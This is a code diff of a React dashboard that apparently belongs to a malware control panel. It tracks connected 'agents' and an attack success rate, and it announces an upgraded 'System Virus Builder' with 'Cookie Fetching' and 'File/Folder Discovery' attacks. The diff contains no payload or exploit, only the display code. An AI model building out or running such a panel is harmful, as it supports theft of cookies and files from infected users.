@@ -4,8 +4,8 @@ import useAuth from '../hooks/useAuth';
 import axios from '../services/api';
 import ReactTimeAgo from 'react-time-ago';
 import { Tooltip } from 'react-tooltip'
-import LiveAgentCard from '../components/DashboardComponents/LiveAgentCard/LiveAgentCard';
 import Modal from '../components/DashboardComponents/Modal/Modal';
+import AgentCard from '../components/AgentComponents/AgentCard/AgentCard';
 
 
 const Dashboard = () => {
@@ -18,7 +18,10 @@ const Dashboard = () => {
         currentAttackingAgents: "0",
         agentsRatio: `N/A`,
         updatedAt: "-",
+        connectedAgentAmount: "0",
+        failPercentage: "%N/A"
     });
+    const [matchedAgents, setMatchedAgents] = useState([]);
     const {auth} = useAuth();
 
     const fetchAgents = async () => {
@@ -38,6 +41,13 @@ const Dashboard = () => {
 
     useEffect(() => {
         if (liveAgentMessage.payload) {
+            const connectedAgentAmount = liveAgentMessage.payload.agent_session_information.length;
+            const failPercentage = agents.reduce((acc, agent) => {
+                const successAttacks = agent.attacks.filter(attack => !attack.crashed).length;
+                const totalAttacks = agent.attacks.length;
+                return acc + (successAttacks / totalAttacks);
+            }, 0) / agents.length;
+
             setPageData({
                 payloadId: (
                     <>
@@ -47,69 +57,122 @@ const Dashboard = () => {
                         </Tooltip>
                     </>
                 ),
+                connectedAgentAmount: connectedAgentAmount,
                 currentAttackingAgents: liveAgentMessage?.payload?.agent_session_information.filter(agent => agent.executing_attack).length,
-                agentsRatio: `${liveAgentMessage.payload.agent_session_information.length}/${agents.length}`,
-                updatedAt: liveAgentMessage.payload ? <ReactTimeAgo date={Date.parse(liveAgentMessage.payload.last_update_date)} locale="en-US"/> : "-"
+                agentsRatio: `${connectedAgentAmount}/${agents.length}`,
+                updatedAt: liveAgentMessage.payload ? <ReactTimeAgo date={Date.parse(liveAgentMessage.payload.last_update_date)} locale="en-US"/> : "-",
+                failPercentage: `${failPercentage * 100}%`
             });
+
         }
     }, [liveAgentMessage]);
 
+    function getConnectedAgentById(id) { 
+      
+        var connectedAgent = null;
+        liveAgentMessage.payload.agent_session_information.forEach((agent) => {
+            if (agent.agent_id === id) {
+                connectedAgent = agent;
+            }
+        });
+        return connectedAgent;
+  
+      }
+  
+      useEffect(() => {
+  
+          const matchedArray = []
+          agents.forEach(item => {
+              matchedArray.push({
+                  agent: item,
+                  matched: getConnectedAgentById(item.user_id)
+              });
+          });
+          setMatchedAgents(matchedArray);
+  
+      }, [agents, liveAgentMessage]);
+
     return (
         
-        <div className='text-text h-[90%]'>
+        <div className='text-black h-[90%]'>
             <div className='mx-12 py-3 h-[100%] max-w'>
                 
-                <div className='mx-5 p-2 rounded bg-secondary/20 flex justify-between'>
+                <div className='section w-[100%] '>
+                    <div className="grid grid-cols-4 gap-4">
 
-                    <div className='p-3 mx-1 bg-background2 rounded'>
-                        <div className='text-sm flex row gap-2'>
-                            <p>Payload ID: </p>
-                            <span>{pageData.payloadId}</span>
+                        <div className='bg-light-pink/70 border-[2px] border-light-pink rounded-lg font-bold p-4 text-center text-[22px]'>
+                            
+                            <div className='flex flex-col justify-between px-5 gap-4'>
+                                <span className=''>Active Agents</span>
+                                <span className='bg-pink px-1 rounded text-light-pink'>{pageData.connectedAgentAmount} socket</span>
+                            </div>
+                            
                         </div>
-                        <div className='text-sm flex row gap-2'>
-                            <p>Attacking Agents:</p>
-                            <span>{pageData.currentAttackingAgents}</span>
+                        <div className='bg-light-green/80 border-[2px] border-light-green rounded-lg font-bold p-4 text-center text-[22px]'>
+                            <div className='flex flex-col justify-between px-5 gap-4'>
+                                <span className=''>Success Rate</span>
+                                <span className='text-light-blue bg-black rounded'>{pageData.failPercentage}</span>
+                            </div>
                         </div>
+                        <div className='bg-light-blue/80 border-[2px] border-light-blue rounded-lg font-bold p-4 text-center text-[22px]'>
+                            <div className='flex flex-col justify-between px-5'>
+                                <span className=''>Announcement</span>
+                                <p className='text-[10px] text-gray-600'>The System Virus Builder has been successfully completed and upgraded to a customized, agent-based version!</p>
+                            </div>
+                        </div>
+                        <div className='bg-pink/80 font-bold border-[2px] border-pink rounded-lg p-4 text-center text-[22px]'>
+                            <div className='flex flex-col justify-between px-5 items-center'>
+                                <h1>Available Attacks</h1>
+                                <div className='flex w-[200px] justify-between'>
+                                    <div className='bg-light-blue/70 text-light-pink p-2 rounded-lg'>
+                                        <p className='text-[9px]'>Cookie Fetching</p>
+                                    </div>
+                                    <div className='bg-light-blue/70 text-light-pink p-2 rounded-lg'>
+                                        <p className='text-[9px]'>File/Folder Discovery</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
                     </div>
-
-                    <div className='p-3 mx-1 bg-background2 rounded'>
-                        <div className='text-sm flex row gap-2'>
-                            <p>Agents: </p>
-                            <span>{pageData.agentsRatio}</span>
-                        </div>
-                        <div className='text-sm flex row gap-2'>
-                            <p className=''>Update:</p>
-                            <span>{pageData.updatedAt}</span>
-                        </div>
-                    </div>
-
                 </div>
 
-                <div className='text-left pl-7 my-6'>
-                    <h1 className='text-lg font-bold uppercase p-2 inline-block relative'>
-                        connected agents
-                        <div className='absolute w-[95%] h-[2px] bg-primary/25 rounded top-0 left-2'></div>
-                    </h1>
-                    <button onClick={() => setIsOpen(true)} className='font-bold bg-primary/25 text-text p-3 ml-5 tranformation translate-y-[-5px] rounded hover:text-white hover:bg-primary/40 transition-all'>
-                        Create Attack 
-                    </button>
-                </div>
+                <div className='section w-[100%] text-white mt-5'>
 
-                <div className='mx-5 text-text bg-background p-2 rounded'>
-                    
-                    {liveAgentMessage?.payload?.agent_session_information.length > 0 
-                    ? liveAgentMessage.payload.agent_session_information.map((agent) => <LiveAgentCard key={agent.agent_id} agent={agent} />)
-                    : <h1 className='text-lg text-center font-bold p-5 m-3 mt-32 shadow-sm shadow-accent bg-background2'>NO AGENT FOUND</h1>}
+                    <div className="grid grid-cols-12 gap-4">
+                        
+                        <div className='col-span-8'>
+                            <h1 className='ml-1 text-[1.3em]'>
+                                <span className='text-gray-500/85'>Dis</span>
+                                <span className='font-extrabold'>Connected</span>
+                                <span className='font-ligth'>Agents</span>
+                            </h1>
+                            {/* connected and disconnected agent information */}
+
+                            <div className='grid-cols-2'>
+
+                                {/* map through data */}
+                                { matchedAgents.map((pair, index) => {
+                                    return (
+                                        <AgentCard key={index} agent={pair.agent} matched={pair.matched} />
+                                    );
+                                })}
+                                
+                            </div>
+
+                        </div>
+
+                        <div className='bg-red-yellow col-span-4'>
+                            <h1 className='ml-1 text-[1.3em] text-black font-semibold inline-block bg-light-pink px-2 rounded'>Attack History</h1>
+                            {/* previos attack executed today and yesterday */}
+
+                        </div>
+                        
+                    </div>
 
                 </div>
 
             </div>
-
-            <Modal 
-                isOpen={isOpen}
-                setIsChanged={setIsChanged}
-                onClose={() => setIsOpen(false)}
-            ></Modal>
 
         </div>
 
